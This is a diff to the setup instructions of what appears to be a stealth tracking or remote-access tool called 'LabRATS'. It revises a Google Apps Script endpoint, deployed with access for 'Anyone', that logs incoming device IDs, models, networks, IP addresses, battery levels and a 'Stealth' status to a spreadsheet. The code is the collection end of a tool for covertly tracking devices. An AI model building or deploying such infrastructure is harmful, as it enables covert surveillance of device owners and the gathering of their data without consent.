@@ -124,15 +124,37 @@ Best for basic IP tracking and logging. No server maintenance required.
 ```javascript
 function doGet(e) { return handleRequest(e); }
 function doPost(e) { return handleRequest(e); }
+
 function handleRequest(e) {
   try {
     var ss = SpreadsheetApp.getActiveSpreadsheet();
     var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
-    if (sheet.getLastRow() == 0) sheet.appendRow(["Timestamp", "Device", "Network", "IP", "Port", "Link", "Battery", "Stealth Status"]);
+    
+    // Auto-initialize headers if new sheet
+    if (sheet.getLastRow() == 0) {
+      sheet.appendRow(["Timestamp", "Device ID", "Model", "Network", "IP", "Link", "Battery", "Stealth"]);
+    }
+    
+    // Parse incoming tactical data (Supports JSON POST and GET params)
     var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
-    sheet.appendRow([new Date(), data.device, data.network, data.ip, data.port, data.link, data.battery, data.stealth]);
-    return ContentService.createTextOutput("SUCCESS");
-  } catch (err) { return ContentService.createTextOutput("ERROR: " + err.message); }
+    
+    // Finalize row with fallbacks for missing packets
+    var row = [
+      new Date(),
+      data.deviceId || "Unknown",
+      data.device || data.model || "Unknown",
+      data.network || "Unknown",
+      data.ip || "Unknown",
+      data.link || "Handshake_Pending",
+      data.battery || "0%",
+      (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF"
+    ];
+    
+    sheet.appendRow(row);
+    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
+  } catch (err) {
+    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
+  }
 }
 ```
 3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** → **Who has Access: Anyone**.
